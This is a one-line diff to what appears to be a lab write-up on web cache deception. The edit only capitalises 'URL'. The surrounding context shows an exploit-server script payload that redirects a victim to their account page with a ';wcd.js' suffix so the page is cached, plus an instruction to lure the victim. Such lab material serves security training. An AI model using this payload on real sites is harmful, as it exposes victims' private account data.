@@ -188,7 +188,7 @@ in the exploit server use add the following the body of the request
 ```js
 <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js"</script>
 ```
-make the victim visit the crafter url of urs.
+make the victim visit the crafter URL of urs.
 
 
 ### References
